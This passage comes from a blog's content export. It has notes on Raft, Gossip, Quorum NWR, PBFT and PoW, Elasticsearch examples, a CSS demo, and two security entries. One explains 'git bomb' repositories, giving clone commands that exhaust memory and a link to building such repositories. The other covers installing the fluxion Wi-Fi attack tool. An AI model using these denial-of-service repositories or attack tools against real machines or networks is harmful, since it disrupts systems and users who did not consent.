<li>比如节点 B、C 的任期编号都是 3，节点 B 的最后一条日志项对应的任期编号为 3，而节点 C 为 2，那么当节点 C请求节点 B 投票给自己时，节点 B 将拒绝投票。</li>
</ol>
</li>
<li>The election is initiated by followers, who elect themselves as candidates; Majority votes refer to more than half of the votes of cluster members; The goal of the majority voting rule is to ensure that there is at most one leader in a given term of office.<ol>
<li>选举是跟随者发起的，推举自己为候选人；大多数选票是指集群成员半数以上的选票；大多数选票规则的目标，是为了保证在一个给定的任期内最多只有一个领导者。</li>
</ol>
</li>
</ol>
</li>
<li>Q: random timeout<ol>
<li>follower wait leader’s heartbeat.跟随者等待领导者心跳信息超时的时间间隔，是随机的</li>
<li>Election will be invalid if no candidate win majority vote. 当没有候选人赢得过半票数，选举无效了，这时需要等待一个随机时间间隔，也就是说，等待选举超时的时间间隔，是随机的</li>
</ol>
</li>
<li>Important notes:<ol>
<li>node with high log integrity can be the leader, log must be successive.</li>
<li>all methods include –term, leader’s heartbeat, random election timeout, first come will be first served vote rule, majority votes rule and so on are trying to promise only one leader at each term and decrease the possibility of failure situation.</li>
</ol>
</li>
</ol>
<h3 id="how-to-copy-log"><a href="#how-to-copy-log" class="headerlink" title="how to copy log"></a>how to copy log</h3><h4 id="log-entry"><a href="#log-entry" class="headerlink" title="log entry"></a>log entry</h4><p>Replica date exists in the form of logs, and log was constructed by log entry.</p>
<ol>
<li><p>command send from client’s request will be executed by status machine.</p>
</li>
<li><p>log index an increase digit number, identifies log entry.</p>
</li>
<li><p>the term number of leader who created this log entry.</p>
</li>
</ol>
<h4 id="copy-log"><a href="#copy-log" class="headerlink" title="copy log"></a>copy log</h4><ol>
<li>接收到客户端请求后，领导者基于客户端请求中的指令，创建一个新日志项，并附加到本地日志中。</li>
<li>领导者通过日志复制 RPC，将新的日志项复制到其他的服务器。</li>
<li>当领导者将日志项，成功复制到大多数的服务器上的时候，领导者会将这条日志项提交到它的状态机中。</li>
<li>领导者将执行的结果返回给客户端。</li>
<li>当跟随者接收到心跳信息，或者新的日志复制 RPC 消息后，如果跟随者发现领导者已经提交了某条日志项，而它还没提交，那么跟随者就将这条日志项提交到本地的状态机中。</li>
</ol>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2021/11/13/distributed-algo/log-1pc.png"
                      class="" title="copy log normal status"
                >

<h4 id="keep-consistency-of-log"><a href="#keep-consistency-of-log" class="headerlink" title="keep consistency of log"></a>keep consistency of log</h4><ol>
<li>领导者通过日志复制 RPC 消息，发送当前最新日志项到跟随者（为了演示方便，假设当前需要复制的日志项是最新的），这个消息的 PrevLogEntry 值为 7，PrevLogTerm 值为 4。</li>
<li>如果跟随者在它的日志中，找不到与 PrevLogEntry 值为 7、PrevLogTerm 值为 4 的日志项，也就是说它的日志和领导者的不一致了，那么跟随者就会拒绝接收新的日志项，并返回失败信息给领导者。</li>
<li>这时，领导者会递减要复制的日志项的索引值，并发送新的日志项到跟随者，这个消息的 PrevLogEntry 值为 6，PrevLogTerm 值为 3。</li>
<li>如果跟随者在它的日志中，找到了 PrevLogEntry 值为 6、PrevLogTerm 值为 3 的日志项，那么日志复制 RPC 返回成功，这样一来，领导者就知道在 PrevLogEntry 值为 6、PrevLogTerm 值为 3 的位置，跟随者的日志项与自己相同。</li>
<li>领导者通过日志复制 RPC，复制并更新覆盖该索引值之后的日志项（也就是不一致的日志项），最终实现了集群各节点日志的一致。</li>
<li><strong>领导者</strong>从来不会 <strong>覆盖或者删除自己的日志</strong>。</li>
</ol>
<h3 id="Member-Changes"><a href="#Member-Changes" class="headerlink" title="Member Changes"></a>Member Changes</h3><p>配置，建议这么理解：它就是在说集群是哪些节点组成的，是集群各节点地址信息的集合。比如节点 A、B、C 组成的集群，那么集群的配置就是[A, B, C]集合。</p>
<p>单节点变更，就是通过一次变更一个节点实现成员变更。不管旧的集群配置是怎么组成的，旧配置的“大多数”和新配置的“大多数”都会有一个节点是重叠的。</p>
<blockquote>
<p>需要你注意的是，在分区错误、节点故障等情况下，如果我们并发执行单节点变更，那么就可能出现一次单节点变更尚未完成，新的单节点变更又在执行，<br>导致集群出现 2 个领导者的情况。<br>如果你遇到这种情况，可以在领导者启动时，创建一个 NO_OP 日志项（也就是空日志项），只有当领导者将 NO_OP 日志项提交后，再执行成员变更请求</p>
</blockquote>
<h2 id="Gossip-protocol"><a href="#Gossip-protocol" class="headerlink" title="Gossip protocol"></a>Gossip protocol</h2><p>业务在可用性上比较敏感，比如监控主机和业务运行的告警系统。这个时候，相信你希望自己的系统能在极端情况下（比如集群中只有一个节点在运行）也能运行。<br>回忆了二阶段提交协议和 Raft 算法之后，你发现它们都需要全部节点或者大多数节点正常运行，才能稳定运行。可以通过 Gossip 协议实现这个目标。</p>
<h3 id="直接邮寄（Direct-Mail）"><a href="#直接邮寄（Direct-Mail）" class="headerlink" title="直接邮寄（Direct Mail）"></a>直接邮寄（Direct Mail）</h3><p>直接发送更新数据，当数据发送失败时，将数据缓存下来，然后重传。但注意下缓存队列满了丢数据的问题，只采用直接邮寄是无法实现最终一致性的，想最终一致得依靠反熵</p>
<h3 id="反熵（Anti-entropy）"><a href="#反熵（Anti-entropy）" class="headerlink" title="反熵（Anti-entropy）"></a>反熵（Anti-entropy）</h3><p>反熵指的是集群中的节点，每隔段时间就随机选择某个其他节点，然后通过互相交换自己的所有数据来消除两者之间的差异，实现数据的最终一致性</p>
<ul>
<li>推：是将自己的所有副本数据，推给对方，修复对方副本中的熵： </li>
<li>拉：是拉取对方的所有副本数据，修复自己副本中的熵</li>
<li>推拉：同时修复自己副本和对方副本中的熵</li>
</ul>
<p>反熵需要节点两两交换和比对自己所有的数据，执行反熵时通讯成本会很高，所以不建议在实际场景中频繁执行反熵， 并且可以通过引入校验和（Checksum）等机制，降低需要对比的数据量和通讯消息等。 </p>
<p>虽然反熵很实用，但是执行反熵时，相关的节点都是已知的，而且节点数量不能太多，如果 是一个动态变化或节点数比较多的分布式环境（比如在 DevOps 环境中检测节点故障，并动态维护集群节点状态），这时反熵就不适用了。<br>那么当你面临这个情况要怎样实现最终一致性呢？答案就是谣言传播。</p>
<h3 id="谣言传播（Rumor-mongering）"><a href="#谣言传播（Rumor-mongering）" class="headerlink" title="谣言传播（Rumor mongering）"></a>谣言传播（Rumor mongering）</h3><p>当一个节点有了新数据后，这个节点变成活跃状态，并周期性地联系其他节点向其发送新数据，直到所有的节点都存储了该新数据（非常具有传染性）</p>
<h3 id="如何使用-Anti-entropy-实现最终一致：-InfluxDB-的反熵样例"><a href="#如何使用-Anti-entropy-实现最终一致：-InfluxDB-的反熵样例" class="headerlink" title="如何使用 Anti-entropy 实现最终一致： InfluxDB 的反熵样例"></a>如何使用 Anti-entropy 实现最终一致： InfluxDB 的反熵样例</h3><p>在自研 InfluxDB 中，一份数据副本是由多个分片组成的，也就是实现了数据分片，三节点三副本的集群，就像下图的样子：</p>
<p>NodeA:Shard]1,S2; NodeB:S1,S2; NodeC:S1,S2</p>
<p>Node ABC 上分片的数据是一致的。</p>
<h5 id="数据丢失的两种功能情况"><a href="#数据丢失的两种功能情况" class="headerlink" title="数据丢失的两种功能情况"></a>数据丢失的两种功能情况</h5><ol>
<li>缺失分片：也就是说，在某个节点上整个分片都丢失了。</li>
<li>节点之间的分片不一致：也就是说，节点上分片都存在，但里面的数据不一样，有数据丢失的情况发生。</li>
</ol>
<p>第一种情况修复起来不复杂，我们只需要将分片数据，通过 RPC 通讯，从其他节点上拷贝过来就可以了。</p>
<p>第二种需要设计一个闭环的流程，按照一个顺序修复，执行完流程后，也就是实现了一致性了。<br>它是按照一定顺序来修复节点的数据差异，先随机选择一个节点，然后循环修复，每个节点生成 <strong>自己节点有、下一个节点没有的差异数据</strong>，发送给下一个节点，进行修复.<br>数据修复的起始节点为节点 A，数据修复是按照顺时针顺序，循环修复的。<br>需要你注意的是，最后节点 A 又对节点 B 的数据执行了一次数据修复操作，因为只有这样，节点 C 有、节点 B 缺失的差异数据，才会同步到节点 B 上.</p>
<p>非随机的原因是希望能在一个确定的时间范围内实现数据副本的最终一致性，而不是基于随机性的概率，在一个不确定的时间范围内实现数据副本的最终一致性</p>
<p>最后需要你注意的是，因为反熵需要做一致性对比，很消耗系统性能，所以建议你将是否启用反熵功能、执行一致性检测的时间间隔等，做成可配置的，能在不同场景中按需使用。</p>
<h2 id="Quorum-NWR"><a href="#Quorum-NWR" class="headerlink" title="Quorum NWR"></a>Quorum NWR</h2><p>适用于已经实现AP了，临时的需求需要C（最终一致性），那么可以采用这个算法，当 <code>W + R &gt; N</code> 时，就可以实现强一致性</p>
<p>N 表示副本数，又叫做复制因子（Replication Factor）。即 N 表示集群中同一份数据有多少个副本。<br>例如在三节点的集群中，DATA-1 有 2 个副本，DATA-2 有 3 个副本，DATA-3 有 1 个副本。也就是说，副本数可以不等于节点数，不同的数据可以有不同的副本数。</p>
<p><code>Quorum NWR</code> 需要实现自定义副本的功能。也就是说，用户可以自定义指定数据的副本数。</p>
<p>W，又称写一致性级别（Write Consistency Level），表示成功完成 W 个副本更新，才完成该份数据的写操作</p>
<p>R，又称读一致性级别（Read Consistency Level），表示读取一个数据对象时需要读 R 个副本。</p>
<p>W + R &gt; N 代表 WR必有交集，交集点就是最新的数据</p>
<h4 id="如何实现-Quorum-NWR"><a href="#如何实现-Quorum-NWR" class="headerlink" title="如何实现 Quorum NWR"></a>如何实现 Quorum NWR</h4><p>InfluxDB 中创建保留策略时设置指定DB的副本数可用命令<br><code>create retention policy “rp_one_day” on “telegraf” duration 1d replication 3</code><br>通过 <code>replication</code> 参数指定了数据库 <code>telegraf</code> 的副本数为3</p>
<p>副本数不能超过节点数据。你可以这么理解，多副本的意义在于冗余备份，如果副本数超过节点数，就意味着在一个节点上会存在多个副本，那么这时冗余备份的意义就不大了。<br>比如机器故障时，节点上的多个副本是同时被影响的。</p>
<p>InfluxDB 企业版，支持“any、one、quorum、all”4 种写一致性级别：</p>
<ol>
<li>any：任何一个节点写入成功后，或者接收节点已将数据写入 Hinted-handoff 缓存（也就是写其他节点失败后，本地节点上缓存写失败数据的队列）后，就会返回成功给客户端。</li>
<li>one：任何一个节点写入成功后，立即返回成功给客户端，不包括成功写入到 Hinted-handoff 缓存。</li>
<li>quorum：当大多数节点写入成功后，就会返回成功给客户端。此选项仅在副本数大于 2时才有意义，否则等效于 all。</li>
<li>all：仅在所有节点都写入成功后，返回成功。</li>
</ol>
<p>对时序数据库而言，读操作常会拉取大量数据，查询性能是挑战，是必须要考虑优化的，因此，在 InfluxDB 企业版中，不支持读一致性级别，只支持写一致性级别。<br>另外，我们可以通过设置写一致性级别为 all，来实现强一致性。</p>
<blockquote>
<p>N 决定了副本的冗余备份能力；<br>如果设置 W &#x3D; N，读性能比较好；<br>如果设置 R &#x3D; N，写性能比较好；<br>如果设置 W &#x3D; (N + 1) &#x2F; 2、R &#x3D; (N + 1) &#x2F; 2，容错能力比较好，能容忍少数节点（也就是 (N - 1) &#x2F; 2）的故障。</p>
</blockquote>
<h2 id="PBFT"><a href="#PBFT" class="headerlink" title="PBFT"></a>PBFT</h2><p>口信消息法有个非常致命的缺陷（为什么落地困难）。如果将军数为 n、叛将数为 f，那么算法需要递归协商 f+1 轮，消息复杂度为 O(n ^ (f + 1))，消息数量指数级暴增。<br>你可以想象一下， 如果叛将数为 64，消息数已经远远超过 int64 所能表示的了，这是无法想象的。</p>
<h3 id="PBFT-如何达成共识"><a href="#PBFT-如何达成共识" class="headerlink" title="PBFT 如何达成共识"></a>PBFT 如何达成共识</h3><p><strong>在这里我想说的是， PBFT 算法是通过签名（或消息认证码 MAC）约束恶意节点的行为， 也就是说，每个节点都可以通过验证消息签名确认消息的发送来源，一个节点无法伪造另外一个节点的消息。最终，基于大多数原则（2f + 1）实现共识的。</strong></p>
<p>需要你注意的是，最终的共识是否达成，客户端（苏秦）是会做判断的，如果客户端在指定时间内未收到请求对应的 f + 1 相同响应，就认为集群出故障了，共识未达成，客户端会重新发送请求。</p>
<p>另外需要你注意的是，PBFT 算法通过视图变更（View Change）的方式，来处理主节点（赵国将领）作恶，当发现主节点在作恶时，会以“轮流上岗”方式，推举新的主节点。</p>
<h4 id="消息消耗仍然较高"><a href="#消息消耗仍然较高" class="headerlink" title="消息消耗仍然较高"></a>消息消耗仍然较高</h4><p>最后我想说的是，尽管 PBFT 算法相比口信消息型拜占庭之解已经有了很大的优化，将消息复杂度从 O(n ^ (f + 1)) 降低为 O(n ^ 2)，能在实际场景中落地，并解决实际的共识问题。<br>但 PBFT 还是需要比较多的消息。比如在 13 节点集群中（f 为 4）。</p>
<ul>
<li>请求消息：1</li>
<li>预准备消息：3f &#x3D; 12</li>
<li>准备消息：3f * (3f - f) &#x3D; 96</li>
<li>提交消息：(3f - f + 1) * (3f + 1)&#x3D; 117</li>
<li>回复消息：3f - 1 &#x3D; 11</li>
<li>也就是说，一次共识协商需要 237 个消息，你看，消息数还是蛮多的，所以我推荐你，在</li>
<li>中小型分布式系统中使用 PBFT 算法。</li>
</ul>
<p>PBFT 算法实现的是一系列值的共识，而不是口信模型的单值的共识</p>
<p>相比 Raft 算法完全不适应有人作恶的场景，PBFT 算法能容忍 (n - 1)&#x2F;3 个恶意节点 (也可以是故障节点)。<br>另外，相比 PoW 算法，PBFT 的优点是不消耗算力，所以在日常实践中，PBFT 比较适用于相对“可信”的场景中，比如联盟链。<br>需要你注意的是，PBFT 算法与 Raft 算法类似，也存在一个“领导者”（就是主节点）， 同样，集群的性能也受限于“领导者”。<br>另外，O(n ^ 2) 的消息复杂度，以及随着消息数的增加，网络时延对系统运行的影响也会越大，这些都限制了运行 PBFT 算法的分布式系统的规模，也决定了 PBFT 算法适用于中小型分布式系统。</p>
<h2 id="PoW算法"><a href="#PoW算法" class="headerlink" title="PoW算法"></a>PoW算法</h2><p>背景： PBFT 算法虽然能防止坏人作恶，但只能防止少数的坏人作恶，也就是 (n - 1) &#x2F; 3 个坏人 (其中 n 为节点数)。<br>可如果区块链也只能防止一定比例的坏人作恶，那就麻烦了，因为坏人可以不断增加节点数，轻松突破 (n - 1) &#x2F; 3 的限制。</p>
<p>区块链通过工作量证明（Proof of Work）增加了坏人作恶的成本。</p>
<h3 id="工作量证明-Proof-Of-Work）"><a href="#工作量证明-Proof-Of-Work）" class="headerlink" title="工作量证明 (Proof Of Work）"></a>工作量证明 (Proof Of Work）</h3><p>我们给出的工作量要求是，基于一个基本的字符串（比如”geektime”），你可以在这个字符串后面添加一个整数值，然后对变更后（添加整数值) 的字符串进行 SHA256 哈希运算，<br>如果运算后得到的哈希值（16 进制形式）是以”0000”开头的，就验证通过。为了达到这个工作量证明的目标，我们需要不停地递增整数值，一个一个试，对得到的新字符串进行SHA256 哈希运算。<br>按照这个规则，我们需要经过 35024 次计算，才能找到恰好前 4 位为 0 的哈希值。</p>
<h3 id="区块链如何实现-PoW-算法的"><a href="#区块链如何实现-PoW-算法的" class="headerlink" title="区块链如何实现 PoW 算法的"></a>区块链如何实现 PoW 算法的</h3><p>区块的组成</p>
<ul>
<li>区块头（Block Head）：区块头主要由上一个区块的哈希值、区块体的哈希值、4 字节的随机数（nonce）等组成的。</li>
<li>区块体（Block Body）：区块包含的交易数据，其中的第一笔交易是 Coinbase 交易，这是一笔激励矿工的特殊交易。</li>
</ul>
<p>拥有 80 字节固定长度的区块头，就是用于区块链工作量证明的哈希运算中输入字符串，而且通过双重 SHA256 哈希运算<br>（也就是对 SHA256 哈希运算的结果，再执行一次哈希运算），计算出的哈希值，只有小于目标值（target），才是有效的，否则哈希值是无效的，必须重算。</p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>distributed algorithm</tag>
        <tag>distributed</tag>
      </tags>
  </entry>
  <entry>
    <title>elastic-search 笔记</title>
    <url>/2020/12/13/elastic-search/</url>
    <content><![CDATA[<ol>
<li><p>A good place to start is with batches of 1,000 to 5,000 documents and a total payload between 5MB and 15MB.</p>
</li>
<li><p>hits._score - the document’s relevance score (not applicable when using match_all)</p>
</li>
<li><p>Each search request is self-contained: Elasticsearch does not maintain any state information across requests. </p>
</li>
<li><p>must or should clause contributes to the document’s relevance score while must_not clause is treated as a filter</p>
<ul>
<li>You can also explicitly specify arbitrary filters to include or exclude documents based on structured data</li>
</ul>
</li>
<li><p>The first alternative is to have an index per document type. Instead of storing tweets and users in a single twitter index, you could store tweets in the tweets index and users in the user index. Indices are completely independent of each other and so there will be no conflict of field types between indices. This approach has two benefits:</p>
<ul>
<li>Data is more likely to be dense and so benefit from compression techniques used in Lucene.</li>
<li>The term statistics used for scoring in full text search are more likely to be accurate because all documents in the same index represent a single entity.</li>
</ul>
</li>
<li><p>Each index can be sized appropriately for the number of documents it will contain: you can use a smaller number of primary shards for users and a larger number of primary shards for tweets.</p>
</li>
</ol>
<div class="code-container" data-rel="Http"><figure class="iseeu highlight http"><figcaption><span>request</span></figcaption><table><tr><td class="code"><pre><span class="line">PUT twitter</span><br><span class="line">&#123;</span><br><span class="line">  &quot;mappings&quot;: &#123;</span><br><span class="line">    &quot;_doc&quot;: &#123;</span><br><span class="line">      &quot;properties&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: &#123; &quot;type&quot;: &quot;keyword&quot; &#125;, </span><br><span class="line">        &quot;name&quot;: &#123; &quot;type&quot;: &quot;text&quot; &#125;,</span><br><span class="line">        &quot;user_name&quot;: &#123; &quot;type&quot;: &quot;keyword&quot; &#125;,</span><br><span class="line">        &quot;email&quot;: &#123; &quot;type&quot;: &quot;keyword&quot; &#125;,</span><br><span class="line">        &quot;content&quot;: &#123; &quot;type&quot;: &quot;text&quot; &#125;,</span><br><span class="line">        &quot;tweeted_at&quot;: &#123; &quot;type&quot;: &quot;date&quot; &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PUT twitter/_doc/user-kimchy</span><br><span class="line">&#123;</span><br><span class="line">  &quot;type&quot;: &quot;user&quot;, </span><br><span class="line">  &quot;name&quot;: &quot;Shay Banon&quot;,</span><br><span class="line">  &quot;user_name&quot;: &quot;kimchy&quot;,</span><br><span class="line">  &quot;email&quot;: &quot;shay@kimchy.com&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PUT twitter/_doc/tweet-1</span><br><span class="line">&#123;</span><br><span class="line">  &quot;type&quot;: &quot;tweet&quot;, </span><br><span class="line">  &quot;user_name&quot;: &quot;kimchy&quot;,</span><br><span class="line">  &quot;tweeted_at&quot;: &quot;2017-10-24T09:00:00Z&quot;,</span><br><span class="line">  &quot;content&quot;: &quot;Types are going away&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">GET twitter/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;bool&quot;: &#123;</span><br><span class="line">      &quot;must&quot;: &#123;</span><br><span class="line">        &quot;match&quot;: &#123;</span><br><span class="line">          &quot;user_name&quot;: &quot;kimchy&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;filter&quot;: &#123;</span><br><span class="line">        &quot;match&quot;: &#123;</span><br><span class="line">          &quot;type&quot;: &quot;tweet&quot; </span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Search engine</tag>
      </tags>
  </entry>
  <entry>
    <title>Exploding Git Repositories</title>
    <url>/2017/10/13/exploding-git-repositories/</url>
    <content><![CDATA[<p>Origin fork： <a class="link"   href="https://kate.io/blog/git-bomb/" >git exploding repo<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> <a class="link"   href="http://www.open-open.com/lib/view/1328070620202" >Tree, blob 可参考<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> <code>git clone https://github.com/Katee/git-bomb.git</code> 值得一试上面的命令。（最好不要用自己的工作物理机） 如果你没有足够大的 RAM 和 storage, 那么通常来说你的 git 会被kill， 然后就是爆内存到逼你重启。</p>
<blockquote>
<p>The secret is that git de-duplicates “blobs” (which are used to store files) to make repositories smaller and allow using the same blob when a file remains unchanged between commits.</p>
</blockquote>
<p>blobs 指的是 类似 <strong>文件内容或inodes</strong>， tree 指的是 类似目录一样的东西 文章开头的那个项目 <strong>git-bomb</strong> 妄想造 a billion files, 然而它实际上只有10 tree 和 10个指向文件blob指针。 实际上这种攻击类似于 笑傲江湖 (XML bomb) ， 因此叫 git bomb。</p>
<h2 id="Structure"><a href="#Structure" class="headerlink" title="Structure"></a><strong>Structure</strong></h2><h4 id="Bottom"><a href="#Bottom" class="headerlink" title="Bottom"></a><strong>Bottom</strong></h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://img.blog.csdn.net/20171013150303196?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2l0aHViXzM1OTU3MTg4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast"
                      alt="blobs"
                > 最底下的有个blob文件有一个laugh。</p>
<pre><code>$ git show 5faa3895522087022ba6fc9e64b02653bd7c4283
one laugh
</code></pre>
<p>而有一个树对象指向这个blob对象10次</p>
<pre><code>$ git ls-tree 6961ae061a9b89b91162c00d55425b39a19c9f90
100644 blob 5faa3895522087022ba6fc9e64b02653bd7c4283    f0
100644 blob 5faa3895522087022ba6fc9e64b02653bd7c4283    f1
# … snipped
100644 blob 5faa3895522087022ba6fc9e64b02653bd7c4283    f9
</code></pre>
<h4 id="Middle"><a href="#Middle" class="headerlink" title="Middle"></a><strong>Middle</strong></h4><p>然后 9 层树对象 指向 它们身后的这个树对象 (这是顶部树对象):</p>
<pre><code>$ git ls-tree 106d3b1c00034193bbe91194eb8a90fc45006377
040000 tree 8d106ebc17b2de80acefd454825d394b9bc47fe6    d0
040000 tree 8d106ebc17b2de80acefd454825d394b9bc47fe6    d1
# … snipped
040000 tree 8d106ebc17b2de80acefd454825d394b9bc47fe6    d9
</code></pre>
<h4 id="Top"><a href="#Top" class="headerlink" title="Top"></a><strong>Top</strong></h4><p>master ref 指向最高树对象。</p>
<pre><code>$ git log --pretty=format:&quot;%s | tree: %T&quot;
Create a git bomb | tree: 106d3b1c00034193bbe91194eb8a90fc45006377
</code></pre>
<p>可以用多种能跑tree的方法 (<code>git status</code>, <code>git checkout</code>) 来测试这个repo， 都会因git在写文件进磁盘前在内存中建树而使内存 奔溃。 这也意味着你的进程会被killed 而不是填充满你的磁盘。</p>
<h3 id="Other-Git-Bombs"><a href="#Other-Git-Bombs" class="headerlink" title="Other Git Bombs"></a><strong>Other Git Bombs</strong></h3><p>Here is a slightly different version of the same idea. This repo has 15,000 nested tree objects. On my laptop this ends up blowing up the stack and causing a segfault. $ git clone <a class="link"   href="https://github.com/Katee/git-bomb-segfault.git" >https://github.com/Katee/git-bomb-segfault.git<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> If you’d like to make your own git bombs read the next post <a class="link"   href="https://kate.io/blog/making-your-own-exploding-git-repos/" >Making Your Own Git Bombs<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>.</p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>blob</tag>
        <tag>bomb</tag>
        <tag>exploding</tag>
        <tag>git</tag>
        <tag>memory</tag>
        <tag>tree</tag>
      </tags>
  </entry>
  <entry>
    <title>fluxion使用</title>
    <url>/2017/01/27/fluxion/</url>
    <content><![CDATA[<ol>
<li><p>安装<br>git clone, 解压即可<br>执行.&#x2F;Install.sh 安装 php-cgi失败</p>
<ul>
<li>解决 apt-get install php5-cgi</li>
</ul>
<p>dhcpd 失败</p>
<ul>
<li>解决 apt-get purge isc-dhcp-common#卸载依赖关系</li>
<li>apt-get install isc-dhcp-common#从新安装依赖关系</li>
<li>apt-get install isc-dhcp-server</li>
</ul>
</li>
<li><p>.&#x2F;fluxion 使用<br>file not present</p>
</li>
</ol>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>php5</tag>
        <tag>wifi</tag>
      </tags>
  </entry>
  <entry>
    <title>Front fun</title>
    <url>/2017/07/09/front-fun/</url>
    <content><![CDATA[<h2 id="light-card"><a href="#light-card" class="headerlink" title="light card"></a>light card</h2><p>Talk is cheap, note is there , show you code.</p>
<div class="code-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">style</span> <span class="attr">media</span>=<span class="string">&quot;screen&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">            <span class="selector-tag">body</span>&#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">background-color</span>: <span class="number">#000</span>;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            <span class="selector-id">#wrap</span>&#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="language-css">                <span class="comment">/*the img size and make it get center*/</span></span></span><br><span class="line"><span class="language-css">                <span class="attribute">width</span>: <span class="number">130px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">margin</span>: <span class="number">150px</span> auto;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">transform-style</span>: preserve-<span class="number">3</span>d;</span></span><br><span class="line"><span class="language-css">                <span class="comment">/*perspective: 1000px;*/</span></span></span><br><span class="line"><span class="language-css">        <span class="comment">/*make the whole items of wrap rotate by the axis */</span></span></span><br><span class="line"><span class="language-css">        <span class="comment">/*perspective, which between 800 and 1000 seems better.*/</span></span></span><br><span class="line"><span class="language-css">                <span class="attribute">transform</span>: <span class="built_in">perspective</span>(<span class="number">1000px</span>) <span class="built_in">rotateX</span>(-<span class="number">10deg</span>) <span class="built_in">rotateY</span>(<span class="number">0deg</span>);</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            <span class="selector-id">#wrap</span>&gt;<span class="selector-tag">div</span>&#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">transition</span>:<span class="number">1s</span>;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            <span class="selector-id">#wrap</span> <span class="selector-tag">img</span>&#123;</span></span><br><span class="line"><span class="language-css">                <span class="comment">/*delete the break between img*/</span></span></span><br><span class="line"><span class="language-css">                <span class="attribute">vertical-align</span>: middle;</span></span><br><span class="line"><span class="language-css">                <span class="comment">/*x-offset y-offset spread-offset color*/</span></span></span><br><span class="line"><span class="language-css">                <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">10px</span> <span class="number">#fff</span>;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">      <span class="comment">/*the inverted img was created*/</span></span></span><br><span class="line"><span class="language-css">            <span class="selector-id">#wrap</span> <span class="selector-tag">div</span> <span class="selector-tag">div</span>&#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">margin-top</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="comment">/*reverse by y axis */</span></span></span><br><span class="line"><span class="language-css">                <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">1</span>,-<span class="number">1</span>);</span></span><br><span class="line"><span class="language-css">                <span class="attribute">background</span>: <span class="built_in">linear-gradient</span>(<span class="built_in">rgb</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>) <span class="number">40%</span>,<span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)),<span class="built_in">url</span>(<span class="string">img/10.jpg</span>);</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-id">#wrap</span> <span class="selector-tag">span</span>&#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">display</span>: block;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">width</span>:<span class="number">1200px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">height</span>:<span class="number">1200px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css">        <span class="comment">/*center span*/</span></span></span><br><span class="line"><span class="language-css">        <span class="attribute">left</span>:<span class="number">50%</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">top</span>:<span class="number">50%</span>;</span></span><br><span class="line"><span class="language-css">        <span 